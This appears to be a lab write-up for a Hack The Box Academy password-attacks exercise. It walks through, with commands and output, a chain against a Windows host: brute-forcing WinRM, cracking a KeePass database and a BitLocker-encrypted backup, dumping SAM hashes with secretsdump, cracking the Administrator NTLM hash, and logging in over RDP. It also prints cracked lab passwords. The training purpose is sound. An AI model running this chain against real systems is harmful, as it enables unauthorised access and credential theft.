The next host is a Windows-based client. As with the previous assessments, our client would like to make sure that an attacker cannot gain access to any sensitive files in the event of a successful attack. While our colleagues were busy with other hosts on the network, we found out that the user ==Johanna== is present on many hosts. However, we have not yet been able to determine the exact purpose or reason for this.

### Nmap Scan

```Bash
──(root㉿kali)-[/home/kali/Password_Attacks/HARD]
└─# nmap 10.129.202.222 -T4 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-06 12:09 EDT
Warning: 10.129.202.222 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.202.222
Host is up (0.30s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE    SERVICE
111/tcp   open     rpcbind
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
2049/tcp  open     nfs
3389/tcp  open     ms-wbt-server
5985/tcp  open     wsman
12547/tcp filtered unknown
22949/tcp filtered unknown
23712/tcp filtered unknown
25701/tcp filtered unknown                                                                                          
29158/tcp filtered unknown                                                                                          
33185/tcp filtered unknown                                                                                          
36150/tcp filtered unknown                                                                                          
47001/tcp open     winrm                                                                                            
49664/tcp open     unknown                                                                                          
49665/tcp open     unknown                                                                                          
49666/tcp open     unknown                                                                                          
49667/tcp open     unknown                                                                                          
49668/tcp open     unknown                                                                                          
49679/tcp open     unknown
49680/tcp open     unknown
49681/tcp open     unknown
51247/tcp filtered unknown
52271/tcp filtered unknown
62224/tcp filtered unknown
63814/tcp filtered unknown
65183/tcp filtered unknown
```

### Download the resources files

```Bash
┌──(root㉿kali)-[/home/kali/Password_Attacks/HARD]
└─# wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
```

### Creating a Mutated Password List

```Bash
hashcat password.list -r custom.rule --stdout | sort -u > mut_password.list
```

### What we have so far?

1. We have the identified username Johanna
2. We have a mutated password list
3. Lets try and crack it
4. We have several services open
5. We have identified there is a winrm service open
6. Lets try and enumerate that

### Brute forcing WinRM with Crackmapexec

```Bash
┌──(root㉿kali)-[/home/kali/Password_Attacks/HARD]
└─# crackmapexec winrm 10.129.202.222 -u Johanna -p easy_pass.txt    
SMB         10.129.202.222  5985   WINSRV           [*] Windows 10 / Server 2019 Build 17763 (name:WINSRV) (domain:WINSRV)
HTTP        10.129.202.222  5985   WINSRV           [*] http://10.129.202.222:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.202.222  5985   WINSRV           [+] WINSRV\Johanna:1231234! (Pwn3d!)
```

- Just for fast track, i used a simpler wordlist to make the bruteforce faster
- ==[+] WINSRV\Johanna:1231234! (Pwn3d!)==

### Authenticating to winrm with Evil-winrm

```Bash
┌──(root㉿kali)-[/home/kali]
└─# evil-winrm -u Johanna -p 1231234! -i 10.129.202.222
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm\#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\johanna\Documents> 
```

### Enumerate the target machine

```Bash
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\johanna\Documents> dir


    Directory: C:\Users\johanna\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/11/2022   2:13 AM           2126 Logins.kdbx
```

- There is a Logins.kdbx file
- We need to download it to see what we can do further

### Downloading the Login document

- It will be stored in the root directory of the current user

```Bash
*Evil-WinRM* PS C:\Users\johanna\Documents> download Logins.kdbx
                                        
Info: Downloading C:\Users\johanna\Documents\Logins.kdbx to Logins.kdbx
                                        
Info: Download successful!
```

### Use keepass2john to convert the kdbx file

```Bash
┌──(root㉿kali)-[/home/kali/Password_Attacks/HARD]
└─# keepass2john Logins.kdbx > Logins.hash
                                                                                                                    
┌──(root㉿kali)-[/home/kali/Password_Attacks/HARD]
└─# ls
custom.rule    Logins.hash  mut_password.list     password.list
easy_pass.txt  Logins.kdbx  Password-Attacks.zip  username.list
```

### Crack the Login hash file with John

```Bash
㉿kali)-[/home/kali/Password_Attacks/HARD]
└─# john --wordlist=mut_password.list Logins.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

- The password is revealed to be ==Qwerty7!==

![[/image 73.png|image 73.png]]

### Connecting to RDP with Johanna user and cracked password

- Since there is an RDP service, lets try the Johanna credentials we previously identified to connect to it

```Bash
xfreerdp3 /v:10.129.202.222 /u:Johanna /p:1231234! -toggle-fullscreen
```

![[/image 1 19.png|image 1 19.png]]

### Open the Login file with the cracked hash password

- Use the password we discovered above: ==Qwerty7!==

![[/image 2 16.png|image 2 16.png]]

![[/image 3 12.png|image 3 12.png]]

- Copy the password to a notepad to view it

![[/image 4 9.png|image 4 9.png]]

- The credentials identified is ==admin:gRzX7YbeTcDG7==

## What to do with this credentials now?

- We can try several things since we have several services open
- We can try SMB, WinRM, and others

### Lets try SMB

- Enumerate SMB Shares

```Bash
┌──(root㉿kali)-[/home/kali]
└─# smbclient -U david -L 10.129.202.222   
Password for [WORKGROUP\david]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        david           Disk      
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.202.222 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available 
```

- Connect to the david share

```Bash
┌──(root㉿kali)-[/home/kali]
└─# smbclient -U david \\\\10.129.202.222\\david  
Password for [WORKGROUP\david]:
Try "help" to get a list of possible commands.
smb: \> 
```

```Bash
smb: \> ls
  .                                   D        0  Fri Feb 11 05:43:03 2022
  ..                                  D        0  Fri Feb 11 05:43:03 2022
  Backup.vhd                          A 136315392  Fri Feb 11 07:16:12 2022

                10328063 blocks of size 4096. 6122997 blocks available
smb: \> 
```

### Download the Backup.vhd

```Bash
get Backup.vhd
```

- Unfortunately I was having connection issues to download this and proceed with the step, so I had to look at the solution to identify the steps
- Of course it was going to be some sort of password attack
- Basically the harddisk was locked with bitlocker
- We need to use bitlocker2john to generate a hash and then crack it with john as we did in previous methods involving different file types
- There after the password we receive is: ==123456789!==
- This password is for the Bitlocker encrypted drive

### Accessing the Drive

1. To access the drive, we need to use ==dislocker== 
    
    ```Bash
    sudo apt-get install dislocker
    ```
    
2. Now, mount the drive as a loopback device and use dislocker in order to access the files:
    
    ```Bash
    sudo mkdir -p /media/bitlocker
    sudo mkdir -p /media/bitlockermount
    sudo losetup -f -P Backup.vhd
    sudo dislocker /dev/loop0p2 -u123456789! -- /media/bitlocker
    sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
    ```
    
3. Access the drive contents:
    
    ```Bash
    ┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[~]
    └──╼ [★]$ cd /media/bitlockermount/
    ┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[/media/bitlockermount]
    └──╼ [★]$ ls -la
    
    total 19100
    drwxrwxrwx 1 root root     4096 Feb 11  2022  .
    drwxr-xr-x 1 root root       64 Nov  9 18:36  ..
    drwxrwxrwx 1 root root        0 Feb 11  2022 '$RECYCLE.BIN'
    -rwxrwxrwx 1 root root    77824 Feb 11  2022  SAM
    -rwxrwxrwx 1 root root 19472384 Feb 11  2022  SYSTEM
    drwxrwxrwx 1 root root     4096 Feb 11  2022 'System Volume Information'
    ```
    

### Run [secretsdump.py](http://secretsdump.py/) locally against the SAM and SYSTEM files:

```Bash
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[/media/bitlockermount]
└──╼ [★]$ secretsdump.py LOCAL -sam SAM -system SYSTEM 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:6ba6aae01bae3868d8bf31421d586153:::
david:1009:aad3b435b51404eeaad3b435b51404ee:b20d19ca5d5504a0c9ff7666fbe3ada5:::
johanna:1010:aad3b435b51404eeaad3b435b51404ee:0b8df7c13384227c017efc6db3913374:::
[*] Cleaning up... 
```

### Crack the NTLM Hash

```Bash
┌─[us-academy-2]─[10.10.14.225]─[htb-ac330204@htb-eixdx1f9yx]─[/media/bitlockermount]
└──╼ [★]$ hashcat -a 0 -m 1000 e53d4d912d96874e83429886c7bf22a1 /home/htb-ac330204/mut_password.list

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache built:
* Filename..: /home/htb-ac330204/Password-Attacks/mut_password.list
* Passwords.: 94044
* Bytes.....: 1034072
* Keyspace..: 94044
* Runtime...: 0 secs

e53d4d912d96874e83429886c7bf22a1:Liverp00l8!     
<SNIP>
```

e53d4d912d96874e83429886c7bf22a1:==Liverp00l8!==

### Login into RDP as the Adminitrator User

```Bash
xfreerdp3 /v:STMIP /u:Administrator /p:'Liverp00l8!' /dynamic-resolution
```

![[/image 5 9.png|image 5 9.png]]

![[/image 6 8.png|image 6 8.png]]